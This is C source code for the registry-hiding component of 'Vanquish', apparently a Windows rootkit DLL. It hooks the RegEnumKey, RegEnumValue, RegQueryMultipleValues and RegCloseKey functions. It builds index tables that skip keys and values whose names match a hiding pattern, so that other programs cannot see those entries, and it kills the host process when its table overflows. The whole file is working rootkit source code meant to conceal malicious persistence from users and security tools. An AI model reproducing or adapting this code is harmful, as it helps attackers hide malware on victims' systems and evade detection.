/******************************************************************************\

	Vanquish DLL HideReg - Copyright (c)2003-2005 XShadow, All rights reserved.

	This program is free software; you can redistribute it but not modify
	it under the terms of license.txt file that came with this package

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
	license for more details.

\******************************************************************************/

#include "vHideReg.h"
#include "..\Utils.h"

LPCSTR OVERFLOW_AVOIDEDA = "Lucky! Lucky! By retrying I managed to avoid overflowing the Indexor\r\n";
LPCSTR OVERFLOW_DETECTEDA = "Gee! Overflowed the Indexor! Hidden registry values may show up...\r\n";
LPCSTR INDEXKEY_OVERFLOWA = "Oops! Overflowed dwIndexKEY! Some keys will not show up...\r\n";
LPCSTR INDEXVAL_OVERFLOWA = "Oops! Overflowed dwIndexVAL! Some values will not show up...\r\n";

DECLARE_HIDEREG

//THE Registry Key Indexor (rki)

//time in msec after wich an operation is considered invalid
const DWORD RKI_TIMEOUT = 500;

//number of tries before declaring rki overflow
const DWORD RKI_RETRY_NUM = 5;

//time to wait between retries in msec
const DWORD RKI_RETRY_TIME = 60;

struct _RegKeyIndirection {
	HKEY hKey;
	DWORD dwTime;
	LPDWORD lpdwIndexKey;
	DWORD dwIndexKeySize;
	LPDWORD lpdwIndexVal;
	DWORD dwIndexValSize;
};
typedef struct _RegKeyIndirection RegKeyIndirection;
typedef struct _RegKeyIndirection *LPRegKeyIndirection;

LPRegKeyIndirection rkiInd;
DWORD dwrkiIndSize; //concurrent open handles
CRITICAL_SECTION csRKI;
BOOL bInit = FALSE;
LPVOID lpRKIBuffer = NULL;

void rkiReplaceIndexKey(HKEY hKey, LPDWORD lpdwIdx);
void rkiReplaceIndexVal(HKEY hKey, LPDWORD lpdwIdx);
int IsInvalid(DWORD i, DWORD dwCurTime);
void rkiCloseHandle(HKEY hKey);
DWORD rkiFindByHandle(HKEY hKey);

void rkiReplaceIndexKey(HKEY hKey, LPDWORD lpdwIdx)
{
	EnterCriticalSection(&csRKI);
	DWORD x, y;

	/*we provide pointers internally, so no checking is needed
	if (!lpdwIdx) return;
	if (IsBadReadPtr(lpdwIdx, sizeof(DWORD))) return;
	if (IsBadWritePtr(lpdwIdx, sizeof(DWORD))) return;
	*/

	x = rkiFindByHandle(hKey); //find index for handle
	y = *lpdwIdx; //save old index
	if (y < rkiInd[x].dwIndexKeySize)
		*lpdwIdx = (rkiInd[x].lpdwIndexKey)[y]; //get new index
	else
		*lpdwIdx = MAXDWORD; //TO IMPLEMENT
	LeaveCriticalSection(&csRKI);
}

void rkiReplaceIndexVal(HKEY hKey, LPDWORD lpdwIdx)
{
	EnterCriticalSection(&csRKI);
	DWORD x, y;

	/*we provide pointers internally, so no checking is needed
	if (!lpdwIdx) return;
	if (IsBadReadPtr(lpdwIdx, sizeof(DWORD))) return;
	if (IsBadWritePtr(lpdwIdx, sizeof(DWORD))) return;
	*/

	x = rkiFindByHandle(hKey); //find index for handle
	y = *lpdwIdx; //save old index
	if (y < rkiInd[x].dwIndexValSize)
		*lpdwIdx = (rkiInd[x].lpdwIndexVal)[y]; //get new index
	else
		*lpdwIdx = MAXDWORD; //TO IMPLEMENT
	LeaveCriticalSection(&csRKI);
}

int IsInvalid(DWORD i, DWORD dwCurTime)
{
	if (i >= dwrkiIndSize) return 2; //check for invalid index i
	if (rkiInd[i].hKey == 0) return 1;

	DWORD dwElapsed;

	if (dwCurTime < rkiInd[i].dwTime)
		dwElapsed = MAXDWORD - rkiInd[i].dwTime + dwCurTime; //in the middle of the night...
	else
		dwElapsed = dwCurTime - rkiInd[i].dwTime;

	if (dwElapsed >= RKI_TIMEOUT) return 1;

	return 0;
}

void rkiCloseHandle(HKEY hKey)
{
	EnterCriticalSection(&csRKI);
	DWORD i;

	for (i = 0; i < dwrkiIndSize; i++)
		if (rkiInd[i].hKey == hKey)
		{
			rkiInd[i].hKey = 0;

			//free allocated memory, if it is the case...
			if (rkiInd[i].dwIndexKeySize) VRTFree(rkiInd[i].lpdwIndexKey);
			if (rkiInd[i].dwIndexValSize) VRTFree(rkiInd[i].lpdwIndexVal);

			//update structure
			rkiInd[i].lpdwIndexKey = NULL;
			rkiInd[i].lpdwIndexVal = NULL;
			rkiInd[i].dwIndexKeySize = 0;
			rkiInd[i].dwIndexValSize = 0;
		}

	//free any last structure
	for (;;)
	{
		if (dwrkiIndSize == 0) break;
		if (rkiInd[dwrkiIndSize - 1].hKey == 0)
		{
			dwrkiIndSize--;
			if (dwrkiIndSize > 0)
				VRTReAlloc(rkiInd, dwrkiIndSize * sizeof(RegKeyIndirection));
			else
				VRTFree(rkiInd);
		}
		else
			break;
	}
	LeaveCriticalSection(&csRKI);
}

void rkiClearIndexor()
{
	if (!bInit)
	{
		bInit = TRUE;
		dwrkiIndSize = 0;
		rkiInd = NULL;
		InitializeCriticalSection(&csRKI);
		lpRKIBuffer = VRTAlloc((MAX_PATH + 1) << 1);
	}
}

void rkiEnd()
{
	if (bInit)
	{
		bInit = FALSE;
		VRTFree(lpRKIBuffer);
		DeleteCriticalSection(&csRKI);
	}
}

DWORD rkiFindByHandle(HKEY hKey)
{
	DWORD ok, i, j, sz, dwCurTime, rty, nw;
	LPVOID lpNew;

	LONG retValue;
	LPWSTR lpName;

	lpName = (LPWSTR)lpRKIBuffer;

	dwCurTime = GetTickCount();
	//find index in rki database
	for (i = 0; i < dwrkiIndSize; i++)
		if (rkiInd[i].hKey == hKey)
		{
			//if (IsInvalid(i, dwCurTime) == 1) continue;
			rkiInd[i].dwTime = dwCurTime;
			return i;
		}

	EnterCriticalSection(&csRKI);
	//not found!!! we must create!!!
	nw = MAXDWORD;
	rty = RKI_RETRY_NUM;

ffree_again:
	//find free slot
	dwCurTime = GetTickCount();
	ok = 0;
	for (i = 0; i < dwrkiIndSize; i++)
		if (IsInvalid(i, dwCurTime) == 1)
		{
			nw = i;
			ok = 1;
			break;
		}
	rty--;

	if ((!ok) && (rty > 0))
	{
		//try to allocate new structure
		nw = dwrkiIndSize;
		dwrkiIndSize++;
		if (dwrkiIndSize == 1)
			lpNew = VRTAlloc(sizeof(RegKeyIndirection));
		else
			lpNew = VRTReAlloc(rkiInd, dwrkiIndSize * sizeof(RegKeyIndirection));
		if (!lpNew) //failed to allocate; retry
		{
			dwrkiIndSize--;
			nw = MAXDWORD;
			VRTWriteLog(FALSE, 0, NULL, OVERFLOW_AVOIDEDA);
			Sleep(RKI_RETRY_TIME);
			goto ffree_again;
		}
		rkiInd = (LPRegKeyIndirection)lpNew;
		ok = 1;
		rkiInd[nw].dwIndexKeySize = 0; //make sure we won't free some unexistent things
		rkiInd[nw].dwIndexValSize = 0;
	}
	LeaveCriticalSection(&csRKI);

	//no free slot; default NO-ERROR handling
	if (!ok)
	{
		VRTWriteLog(FALSE, 0, NULL, OVERFLOW_DETECTEDA);
		ExitProcess(0); //we exit; fuck registry!!!
	}

	//update hkey last
	rkiInd[nw].hKey = (HKEY)MAXDWORD;
	rkiInd[nw].dwTime = GetTickCount();

	//free allocated memory, if it is the case...
	if (rkiInd[nw].dwIndexKeySize) VRTFree(rkiInd[nw].lpdwIndexKey);
	if (rkiInd[nw].dwIndexValSize) VRTFree(rkiInd[nw].lpdwIndexVal);

	//update structure
	rkiInd[nw].lpdwIndexKey = NULL;
	rkiInd[nw].lpdwIndexVal = NULL;
	rkiInd[nw].dwIndexKeySize = 0;
	rkiInd[nw].dwIndexValSize = 0;

	//parse key
	ok = 0;
	for (i = 0;; i++)
	{
		if (i >= rkiInd[nw].dwIndexKeySize)
		{
			if (rkiInd[nw].dwIndexKeySize == 0)
				lpNew = VRTAlloc((i + 1) * sizeof(DWORD));
			else
				lpNew = VRTReAlloc((rkiInd[nw].lpdwIndexKey), (i + 1) * sizeof(DWORD));
			if (!lpNew) //failed to alloc
			{
				ok = 0;
				break;
			}
			rkiInd[nw].dwIndexKeySize = i + 1;
			rkiInd[nw].lpdwIndexKey = (LPDWORD)lpNew;
		}

		sz = MAX_PATH + 1;
		RESTORE_API(RegEnumKeyExW);

		//equivalent to: retValue = RegEnumKeyExW(hKey, i, lpName, MAX_PATH + 1, NULL, NULL, NULL, NULL);
		SIMPLE_CARG(0);
		SIMPLE_CARG(0);
		SIMPLE_CARG(0);
		SIMPLE_CARG(0);
		SIMPLE_PARG(sz);
		SIMPLE_ARG(lpName);
		SIMPLE_ARG(i);
		SIMPLE_ARG(hKey);
		SIMPLE_CALL(RegEnumKeyExW);

		REPLACE_API(RegEnumKeyExW);
		if (retValue != ERROR_SUCCESS)
		{
			ok = 1;
			break;
		}

		if (posw0(lpName) == MAXDWORD)
			rkiInd[nw].lpdwIndexKey[i] = i;
		else
			rkiInd[nw].lpdwIndexKey[i] = MAXDWORD;
	}

	if (!ok)
	{
		VRTWriteLog(FALSE, 0, NULL, INDEXKEY_OVERFLOWA);
		ExitProcess(0); //we exit; fuck registry!!!
	}

	sz = i;
	//for NOCRASH reasons we do this
	for (i = sz; i < (rkiInd[nw].dwIndexKeySize); i++)
		rkiInd[nw].lpdwIndexKey[i] = MAXDWORD;

	//do indexing
	j = 0;
	ok = 1;
	for (i = 0; (i < sz) && (j < (rkiInd[nw].dwIndexKeySize)); i++)
	{
		while (rkiInd[nw].lpdwIndexKey[j] == MAXDWORD)
		{
			j++;
			if (j >= sz)
			{
				ok = 0;
				break;
			}
		}

		if (!ok)
		{
			rkiInd[nw].lpdwIndexKey[i] = MAXDWORD;
			break;
		}

		rkiInd[nw].lpdwIndexKey[i] = rkiInd[nw].lpdwIndexKey[j];
		j++;
	}

	sz = i + 1;
	//for NOCRASH reasons we do this
	for (i = sz; i < (rkiInd[nw].dwIndexKeySize); i++)
		rkiInd[nw].lpdwIndexKey[i] = MAXDWORD;

	//parse values
	ok = 0;
	for (i = 0;; i++)
	{
		if (i >= rkiInd[nw].dwIndexValSize)
		{
			if (rkiInd[nw].dwIndexValSize == 0)
				lpNew = VRTAlloc((i + 1) * sizeof(DWORD));
			else
				lpNew = VRTReAlloc((rkiInd[nw].lpdwIndexVal), (i + 1) * sizeof(DWORD));
			if (!lpNew) //failed to alloc
			{
				ok = 0;
				break;
			}
			rkiInd[nw].dwIndexValSize = i + 1;
			rkiInd[nw].lpdwIndexVal = (LPDWORD)lpNew;
		}

		sz = MAX_PATH + 1;
		RESTORE_API(RegEnumValueW);

		//equivalent to: retValue = RegEnumValueW(hKey, i, lpName, &sz, NULL, NULL, NULL, NULL);
		SIMPLE_ARG(NULL);
		SIMPLE_ARG(NULL);
		SIMPLE_ARG(NULL);
		SIMPLE_ARG(NULL);
		SIMPLE_PARG(sz);
		SIMPLE_ARG(lpName);
		SIMPLE_ARG(i);
		SIMPLE_ARG(hKey);
		SIMPLE_CALL(RegEnumValueW);

		REPLACE_API(RegEnumValueW);
		if (retValue != ERROR_SUCCESS)
		{
			ok = 1;
			break;
		}

		if (posw0(lpName) == MAXDWORD)
			rkiInd[nw].lpdwIndexVal[i] = i;
		else
			rkiInd[nw].lpdwIndexVal[i] = MAXDWORD;
	}

	if (!ok)
	{
		VRTWriteLog(FALSE, 0, NULL, INDEXVAL_OVERFLOWA);
		ExitProcess(0);
	}

	sz = i;
	//for NOCRASH reasons we do this
	for (i = sz; i < (rkiInd[nw].dwIndexValSize); i++)
		rkiInd[nw].lpdwIndexVal[i] = MAXDWORD;

	//do indexing
	j = 0;
	ok = 1;
	for (i = 0; (i < sz) && (j < (rkiInd[nw].dwIndexValSize)); i++)
	{
		while (rkiInd[nw].lpdwIndexVal[j] == MAXDWORD)
		{
			j++;
			if (j >= sz)
			{
				ok = 0;
				break;
			}
		}

		if (!ok)
		{
			rkiInd[nw].lpdwIndexVal[i] = MAXDWORD;
			break;
		}

		rkiInd[nw].lpdwIndexVal[i] = rkiInd[nw].lpdwIndexVal[j];
		j++;
	}

	sz = i + 1;
	//for NOCRASH reasons we do this
	for (i = sz; i < (rkiInd[nw].dwIndexValSize); i++)
		rkiInd[nw].lpdwIndexVal[i] = MAXDWORD;

	//confirm free slot
	rkiInd[nw].hKey = hKey;

	return nw;
}

NEWAPI
LONG
APIENTRY
VRegCloseKey(
	HKEY hKey
	)
{
	LONG retValue = ERROR_REGISTRY_IO_FAILED;

	rkiCloseHandle(hKey);

	RESTORE_API(RegCloseKey);
	OLDCALL(RegCloseKey, 1);
	REPLACE_API(RegCloseKey);

	return retValue;
}

NEWAPI
LONG
APIENTRY
VRegEnumKeyW(
    HKEY hKey,
    DWORD dwIndex,
    LPWSTR lpName,
    DWORD cbName
    )
{
	LONG retValue = ERROR_REGISTRY_IO_FAILED;

	rkiReplaceIndexKey(hKey, &dwIndex);

	//api thing
	RESTORE_API(RegEnumKeyW);
	OLDCALL(RegEnumKeyW, 4);
	REPLACE_API(RegEnumKeyW);

	return retValue;
}

NEWAPI
LONG
APIENTRY
VRegEnumKeyA(
    HKEY hKey,
    DWORD dwIndex,
    LPSTR lpName,
    DWORD cbName
    )
{
	LONG retValue = ERROR_REGISTRY_IO_FAILED;

	rkiReplaceIndexKey(hKey, &dwIndex);

	//api thing
	RESTORE_API(RegEnumKeyA);
	OLDCALL(RegEnumKeyA, 4);
	REPLACE_API(RegEnumKeyA);

	return retValue;
}

NEWAPI
LONG
APIENTRY
VRegEnumKeyExW(
    HKEY hKey,
    DWORD dwIndex,
    LPWSTR lpName,
    LPDWORD lpcbName,
    LPDWORD lpReserved,
    LPWSTR lpClass,
    LPDWORD lpcbClass,
    PFILETIME lpftLastWriteTime
    )
{
	LONG retValue = ERROR_REGISTRY_IO_FAILED;

	rkiReplaceIndexKey(hKey, &dwIndex);

	//api thing
	RESTORE_API(RegEnumKeyExW);
	OLDCALL(RegEnumKeyExW, 8);
	REPLACE_API(RegEnumKeyExW);

	return retValue;
}

NEWAPI
LONG
APIENTRY
VRegEnumKeyExA(
    HKEY hKey,
    DWORD dwIndex,
    LPSTR lpName,
    LPDWORD lpcbName,
    LPDWORD lpReserved,
    LPSTR lpClass,
    LPDWORD lpcbClass,
    PFILETIME lpftLastWriteTime
    )
{
	LONG retValue = ERROR_REGISTRY_IO_FAILED;

	rkiReplaceIndexKey(hKey, &dwIndex);

	//api thing
	RESTORE_API(RegEnumKeyExA);
	OLDCALL(RegEnumKeyExA, 8);
	REPLACE_API(RegEnumKeyExA);

	return retValue;
}

NEWAPI
LONG
APIENTRY
VRegEnumValueW(
    HKEY hKey,
    DWORD dwIndexVal,
    LPWSTR lpValueName,
    LPDWORD lpcbValueName,
    LPDWORD lpReserved,
    LPDWORD lpType,
    LPBYTE lpData,
    LPDWORD lpcbData
    )
{
	LONG retValue = ERROR_REGISTRY_IO_FAILED;

	rkiReplaceIndexVal(hKey, &dwIndexVal);

	//do the api thing
	RESTORE_API(RegEnumValueW);
	OLDCALL(RegEnumValueW, 8);
	REPLACE_API(RegEnumValueW);

	return retValue;
}

NEWAPI
LONG
APIENTRY
VRegEnumValueA(
    HKEY hKey,
    DWORD dwIndexVal,
    LPSTR lpValueName,
    LPDWORD lpcbValueName,
    LPDWORD lpReserved,
    LPDWORD lpType,
    LPBYTE lpData,
    LPDWORD lpcbData
    )
{
	LONG retValue = ERROR_REGISTRY_IO_FAILED;

	rkiReplaceIndexVal(hKey, &dwIndexVal);

	//do the api thing
	RESTORE_API(RegEnumValueA);
	OLDCALL(RegEnumValueA, 8);
	REPLACE_API(RegEnumValueA);

	return retValue;
}

NEWAPI
LONG
APIENTRY
VRegQueryMultipleValuesW(
    HKEY hKey,
    PVALENTW val_list,
    DWORD num_vals,
    LPWSTR lpValueBuf,
    LPDWORD ldwTotsize
    )
{
/****************EXPERIMENTAL******************/
	LONG retValue = ERROR_REGISTRY_IO_FAILED;

	//this is simpler! no rki database is needed for this!
	DWORD i;

	VRTWriteLog(FALSE, 0, NULL, "*** Finally somebody invoked RegQueryMultipleValuesW\r\n");

	if (val_list)
		for (i = 0; i < num_vals; i++)
			if (posw0(val_list[i].ve_valuename) != MAXDWORD)
				return ERROR_CANTREAD;

	//api processing
	RESTORE_API(RegQueryMultipleValuesW);
	OLDCALL(RegQueryMultipleValuesW, 5);
	REPLACE_API(RegQueryMultipleValuesW);

	return retValue;
}

NEWAPI
LONG
APIENTRY
VRegQueryMultipleValuesA (
    HKEY hKey,
    PVALENTA val_list,
    DWORD num_vals,
    LPSTR lpValueBuf,
    LPDWORD ldwTotsize
    )
{
/****************EXPERIMENTAL******************/
	LONG retValue = ERROR_REGISTRY_IO_FAILED;

	//this is simpler! no rki database is needed for this!
	DWORD i;

	VRTWriteLog(FALSE, 0, NULL, "*** Finally somebody invoked RegQueryMultipleValuesA\r\n");

	if (val_list)
		for (i = 0; i < num_vals; i++)
			if (pos0(val_list[i].ve_valuename) != MAXDWORD)
				return ERROR_CANTREAD;

	//api processing
	RESTORE_API(RegQueryMultipleValuesA);
	OLDCALL(RegQueryMultipleValuesA, 5);
	REPLACE_API(RegQueryMultipleValuesA);

	return retValue;
}